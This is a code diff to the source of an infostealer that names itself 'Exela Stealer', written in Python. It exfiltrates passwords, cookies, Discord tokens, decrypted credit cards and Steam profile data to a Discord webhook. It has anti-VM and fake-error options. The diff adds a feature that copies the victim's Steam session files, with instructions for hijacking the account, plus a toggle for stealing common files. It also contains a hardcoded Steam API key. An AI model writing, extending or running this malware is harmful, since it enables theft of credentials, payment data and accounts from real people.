@@ -15,11 +15,13 @@ import aiohttp
 import base64
 import time
 
+
 webhook = '%WEBHOOK%'
 discord_injection = bool("%injection%")
 startup_method = "%startup_method%".lower()
 Anti_VM = bool("%Anti_VM%")
 FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))
+StealFiles = bool("%StealCommonFiles%")
 
 class Variables:
     Passwords = list()
@@ -267,7 +269,8 @@ class Main:
             asyncio.create_task(self.GetFirefoxAutoFills()),
             asyncio.create_task(self.GetSteamSession()),
             asyncio.create_task(self.GetTokens()),
-            StealSystemInformation().FunctionRunner()]
+            StealSystemInformation().FunctionRunner()
+            ]
         await asyncio.gather(*taskk)
         await self.WriteToText()
         await self.SendAllData()
@@ -444,7 +447,7 @@ class Main:
                     if card[2] < 10:
                         month = "0" + str(card[2])
                     else:month = card[2]
-                    Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key)} {month}/{card[1]} {card[3]}\n")
+                    Variables.Cards.append(f"{SubModules.Decrpytion(card[0], key)}\t{month}/{card[1]}\t{card[3]}\n")
         except:
             pass 
     async def GetCookies(self) -> None:
@@ -1491,42 +1494,27 @@ class Main:
                 if os.path.exists(drive_letter + ':\\'):
                     all_disks.append(drive_letter)
             for steam_paths in all_disks:
-                if "64" in platform.architecture()[0]:
-                    steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
-                else:
-                    steam_paths = os.path.join(steam_paths + ":\\", "Program Files", "Steam", "config", "loginusers.vdf")
+                steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                 if os.path.isfile(steam_paths):
                     with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                         steamid = "".join(re.findall(r"7656[0-9]{13}", file.read()))
                         if steamid:
                             async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
-                                url = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + steamid
+                                url1 = "https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + steamid
                                 url2 = "https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamid
-                                url3 = "https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + steamid
-                                urls = [url, url2, url3]
-                                tasks = []
-                                for url in urls:
-                                    tasks.append(self.fetch_url(session, url))
-                                responses = await asyncio.gather(*tasks)
-                                for response in responses:
-                                    if "steamid" in response:
-                                        response = json.loads(response)
-                                        player_data = response["response"]["players"][0]
-                                        personname = player_data["personaname"]
-                                        profileurl = player_data["profileurl"]
-                                        avatar = player_data["avatarfull"]
-                                        if player_data["realname"]:
-                                            realname = player_data["realname"]
-                                        else:realname = "None"
-                                        timecreated = player_data["timecreated"]
-                                    if "player_level" in response:
-                                        response = json.loads(response)
-                                        player_level = response["response"]["player_level"]
-                                    if "game_count" in response:
-                                        response = json.loads(response)
-                                        game_count = response["response"]["game_count"]
-                                    if not "game_count" in response:
-                                        game_count = "0"
+                                async with session.get(url1) as req:
+                                    response = await req.json()
+                                async with session.get(url2) as req2:
+                                    response2 = await req2.json()
+                                player_data = response["response"]["players"][0]
+                                personname = player_data["personaname"]
+                                profileurl = player_data["profileurl"]
+                                avatar = player_data["avatarfull"]
+                                timecreated = player_data["timecreated"]
+                                if player_data["realname"]:
+                                    realname = player_data["realname"]
+                                else:realname = "None"
+                                player_level = response2["response"]["player_level"]
                                 embed_data = {
                                     "title": "***Exela Stealer***",
                                     "description": f"***Exela Steam Session Detected***",
@@ -1540,8 +1528,7 @@ class Main:
                                         {"name": "ID", "value": "``" +  str(steamid) + "``", "inline": True},
                                         {"name": "Timecreated", "value": "``" + str(timecreated) + "``", "inline": True},
                                         {"name": "Player Level", "value":"``" + str(player_level) + "``", "inline": True},
-                                        {"name": "Game Count", "value":"``" + str(game_count) + "``", "inline": True},
-                                        {"name": "Profile URL", "value": "``" + str(profileurl) + "``", "inline": False},]
+                                        {"name": "Profile URL", "value": "``" + str(profileurl) + "``", "inline": True},]
                                 embed_data["fields"] = fields
                                 async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                     payload = {
@@ -1553,15 +1540,21 @@ class Main:
                                     }
                                     async with session.post(webhook, json=payload, headers=headers) as response:
                                         pass
-                                Variables.SteamAccounts.append(f"Username : {personname}\nRealname : {realname}\nID : {steamid}\nTimecreated : {timecreated}\nProfile URL : {profileurl}\n======================================================================\n")
-
-        except:
-            pass            
-    async def fetch_url(self,session, url) -> str:
+        except Exception as e:
+            print(e)            
+    async def StealSteamSessionFiles(self, uuid:str) -> None:
         try:
-            async with session.get(url) as response:
-                return await response.text()
-        except:return "null"
+            save_path = os.path.join(self.Temp, uuid)
+            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
+            if os.path.isdir(steam_path):
+                to_path = os.path.join(save_path, "Games", "Steam")
+                if not os.path.isdir(to_path):
+                    os.mkdir(to_path)
+                shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
+                with open(os.path.join(to_path, "How to Use.txt"),"w", errors="ignore", encoding="utf-8") as file:
+                    file.write("https://t.me/ExelaStealer\n===========================================\nFirst close your steam and open this folder on your Computer, <C:\\Program Files (x86)\\Steam\\config>\nSecond Replace all this files with stolen Files\nFinally you can start steam.\n")
+        except:
+            return "null"
     
     async def WriteToText(self) -> None:
         try:
@@ -1589,6 +1582,7 @@ class Main:
             await self.StealUplay(uuid)
             await self.StealEpicGames(uuid)
             await self.StealGrowtopia(uuid)
+            await self.StealSteamSessionFiles(uuid)
             if len(os.listdir(os.path.join(filePath, "Games"))) == 0:
                 try:
                     shutil.rmtree(os.path.join(filePath, "Games"))
@@ -1949,7 +1943,6 @@ class DiscordInjection:
         self.tokens = Variables.ValidatedTokens # stolen discord tokens for logout discord accounts
         self.already_killed = False
         self.LocalAppData = os.getenv("localappdata")
-        print(self.tokens)
     async def InjectIntoToDiscord(self) -> None:
         try:
             if discord_injection:
@@ -2406,7 +2399,8 @@ if __name__ == '__main__':
             main_instance = Main()
             asyncio.run(main_instance.FunctionRunner())
             asyncio.run(DiscordInjection().InjectIntoToDiscord())
-            asyncio.run(StealCommonFiles().StealFiles())
+            if StealFiles == True:
+                asyncio.run(StealCommonFiles().StealFiles())
             print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
     else:
         print("just Windows Operating system's supported by Exela")
